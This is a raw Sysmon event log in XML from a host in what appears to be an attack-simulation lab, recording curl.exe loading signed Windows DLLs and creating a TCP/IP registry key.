<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.334229200Z'/><EventRecordID>34354188</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.333</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.334158700Z'/><EventRecordID>34354187</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.333</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.334087500Z'/><EventRecordID>34354186</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.333</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.334010400Z'/><EventRecordID>34354185</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.333</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\rasadhlp.dll</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Remote Access AutoDial Helper</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>rasadhlp.dll</Data><Data Name='Hashes'>MD5=FAE8D0480BDD905EEA453D3A57C8D5C6,SHA256=C1531223B8201B344A6A6474CB2D9B8A8C632250A3A6F472EC5E2D7D28ADD94C</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.333534500Z'/><EventRecordID>34354184</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.332</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.333443600Z'/><EventRecordID>34354183</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.332</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>12</EventID><Version>2</Version><Level>4</Level><Task>12</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.333358400Z'/><EventRecordID>34354182</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='EventType'>CreateKey</Data><Data Name='UtcTime'>2021-10-19 16:32:42.332</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='TargetObject'>HKLM\System\CurrentControlSet\Services\Tcpip\Parameters</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.333111400Z'/><EventRecordID>34354181</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.332</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\nsi.dll</Data><Data Name='FileVersion'>10.0.14393.3297 (rs1_release_1.191001-1045)</Data><Data Name='Description'>NSI User-mode interface DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>nsi.dll</Data><Data Name='Hashes'>MD5=994E2A6D2A0B38E0968B3998E42033AC,SHA256=491F2D1DE09C39B324BCF5800198AC7CCE755F4023F1FEB3854D33716461BC27</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.332909500Z'/><EventRecordID>34354180</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.332</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\dnsapi.dll</Data><Data Name='FileVersion'>10.0.14393.4350 (rs1_release.210407-2154)</Data><Data Name='Description'>DNS Client API DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>dnsapi</Data><Data Name='Hashes'>MD5=D7651F99299B13D576A72643BFC44944,SHA256=589302E630C473DBDF4CE92C59F00B029FCA0C228E7111A764166E16025FA1A9</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.331359100Z'/><EventRecordID>34354179</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.330</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\mswsock.dll</Data><Data Name='FileVersion'>10.0.14393.3659 (rs1_release_1.200410-1813)</Data><Data Name='Description'>Microsoft Windows Sockets 2.0 Service Provider</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>mswsock.dll</Data><Data Name='Hashes'>MD5=B52ACA309FD6F72105951FFBA022327B,SHA256=02AB6CCE4BF0D3F075D5E982F5A4CBDB514CE7C245EA474D7846A86CD3F13202</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.330306400Z'/><EventRecordID>34354178</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.329</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\IPHLPAPI.DLL</Data><Data Name='FileVersion'>10.0.14393.2339 (rs1_release_inmarket.180611-1502)</Data><Data Name='Description'>IP Helper API</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>iphlpapi.dll</Data><Data Name='Hashes'>MD5=3CD38EDF9CA12F91131EDEE32D1C9DF5,SHA256=AF2440640BF8BDEAAF0DECDD7C354158E415ED0AA340ABA7A6CCCDC09C1E728B</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.329934900Z'/><EventRecordID>34354177</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.329</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\sspicli.dll</Data><Data Name='FileVersion'>10.0.14393.2580 (rs1_release_inmarket.181009-1745)</Data><Data Name='Description'>Security Support Provider Interface</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sspicli.dll</Data><Data Name='Hashes'>MD5=5061339CE61C0B32DB8F51A95E3B2422,SHA256=60558CA374334D4C6BBAD475921538C14A9FF3422893348A0503C1F33015FD25</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.329384000Z'/><EventRecordID>34354176</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.328</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\secur32.dll</Data><Data Name='FileVersion'>10.0.14393.2273 (rs1_release_1.180427-1811)</Data><Data Name='Description'>Security Support Provider Interface</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>secur32.dll</Data><Data Name='Hashes'>MD5=BCF1B2F76F8A3A3E9E8F4D4322954651,SHA256=46B327CD50E728CBC22BD80F39DCEF2789AB780C77B6D285EEB90126B06EEEB5</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.326849000Z'/><EventRecordID>34354175</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.325</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\imm32.dll</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Multi-User Windows IMM32 API Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>imm32</Data><Data Name='Hashes'>MD5=E1024CF2E35DD3467F52BC83F7FEDA3F,SHA256=59C87761AD509BD096C2F35257C2370FB94B95160CB63FB9E66DFD8210AB002A</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.325663200Z'/><EventRecordID>34354174</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.324</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\ws2_32.dll</Data><Data Name='FileVersion'>10.0.14393.3241 (rs1_release_inmarket.190910-1801)</Data><Data Name='Description'>Windows Socket 2.0 32-Bit DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>ws2_32.dll</Data><Data Name='Hashes'>MD5=06E82905620845A7C185BDEE85CC4140,SHA256=B75C9B080293F85568912BABE749F403144959206F9C6BAB36B628E8F77C5DA0</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.325423500Z'/><EventRecordID>34354173</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.324</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\Wldap32.dll</Data><Data Name='FileVersion'>10.0.14393.3269 (rs1_release.190929-1234)</Data><Data Name='Description'>Win32 LDAP API DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>WLDAP32.DLL</Data><Data Name='Hashes'>MD5=12D6C3E8AC705BB42D377C05714F551C,SHA256=E67F6DB96F062A319312C365F1F55B2B38B0F90B77FFDA2522418709CBA45EB3</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.325090500Z'/><EventRecordID>34354172</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.324</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\gdi32full.dll</Data><Data Name='FileVersion'>10.0.14393.4530 (rs1_release.210705-0736)</Data><Data Name='Description'>GDI Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>gdi32</Data><Data Name='Hashes'>MD5=9D82D7DBC3D9E0D8E86D10A5B1BF736E,SHA256=270CA1A42ECB4C22E826C1C95924F0014CC99254AB55B7167DA144D45E238E6D</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
